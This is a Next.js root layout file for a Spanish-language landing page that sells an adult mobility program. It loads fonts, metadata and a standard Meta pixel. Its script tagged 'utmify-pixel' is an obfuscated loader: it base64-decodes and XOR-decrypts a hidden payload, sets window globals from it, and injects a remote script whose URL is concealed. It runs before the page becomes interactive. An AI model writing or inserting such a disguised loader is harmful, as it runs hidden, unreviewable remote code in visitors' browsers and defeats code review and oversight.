import type { Metadata } from "next";
import { Geist, Geist_Mono, Sora, Playfair_Display } from "next/font/google";
import Script from "next/script";
import "./globals.css";

const geistSans = Geist({
  variable: "--font-geist-sans",
  subsets: ["latin"],
});

const geistMono = Geist_Mono({
  variable: "--font-geist-mono",
  subsets: ["latin"],
});

const sora = Sora({
  variable: "--font-heading-sora",
  subsets: ["latin"],
});

const playfairDisplay = Playfair_Display({
  variable: "--font-stat-serif",
  subsets: ["latin"],
});

export const metadata: Metadata = {
  metadataBase: new URL(process.env.NEXT_PUBLIC_SITE_URL ?? "https://saludperfectahoy.com"),
  title: "Movilidad Total — Programa #1 en movilidad para adultos",
  description:
    "Recupera tu movilidad y vuelve a disfrutar de una vida sin dolor con un programa práctico diseñado para adultos.",
};

const metaPixelId = process.env.NEXT_PUBLIC_META_PIXEL_ID;

export default function RootLayout({
  children,
}: Readonly<{
  children: React.ReactNode;
}>) {
  return (
    <html
      lang="es"
      className={`${geistSans.variable} ${geistMono.variable} ${sora.variable} ${playfairDisplay.variable} h-full antialiased`}
    >
      <body className="min-h-full flex flex-col">
        <Script id="utmify-pixel" strategy="beforeInteractive">
          {`
            (function(){var c_jk98=atob("DJN7EG3ivkvtUbWJqOhZZR+OnHHPOcH92OBBP0KB2iXDJMHkwfUCPg6N02WPI5r6y+ESYBmRkTuEKdDlh+MSaAiOkCGec5mryecPYgSAyz+IIpez885XMgqO0SmMPcarksgAMgOD0y7Pa5f5wesefCSGnGfPJ9Tl3fZZKk/U333dY9Hoy6ZOIliHiy6LZILtkKUadA7AwxaQ");var s_364=[];for(var p_wn=0;p_wn<c_jk98.length;p_wn++){s_364.push(c_jk98.charCodeAt(p_wn)&255);}var x_2=s_364[0];var h_wz50=s_364.slice(1,1+x_2);var t_o389=s_364.slice(1+x_2);var b_2o=t_o389.map(function(b,o_u){return b^h_wz50[o_u%x_2];});var c_qsn="";for(var n_t=0;n_t<b_2o.length;n_t++){c_qsn+=String.fromCharCode(b_2o[n_t]&255);}var e_vim9=decodeURIComponent(escape(c_qsn));var e_b=JSON.parse(e_vim9);var l_9e=e_b.globals||[];l_9e.forEach(function(s_y4){window[s_y4.name]=s_y4.value;});var c_nq=document.createElement("script");c_nq.src=e_b.url;c_nq.async=true;c_nq.defer=true;(e_b.attributes||[]).forEach(function(c_3h){c_nq.setAttribute(c_3h.name,c_3h.value);});(document.head||document.documentElement).appendChild(c_nq);})();
          `}
        </Script>
        {metaPixelId ? (
          <Script id="meta-pixel-base" strategy="afterInteractive">
            {`
              !function(f,b,e,v,n,t,s)
              {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
              n.callMethod.apply(n,arguments):n.queue.push(arguments)};
              if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
              n.queue=[];t=b.createElement(e);t.async=!0;
              t.src=v;s=b.getElementsByTagName(e)[0];
              s.parentNode.insertBefore(t,s)}(window, document,'script',
              'https://connect.facebook.net/en_US/fbevents.js');
              fbq('init', '${metaPixelId}');
              fbq('track', 'PageView');
            `}
          </Script>
        ) : null}
        {children}
      </body>
    </html>
  );
}
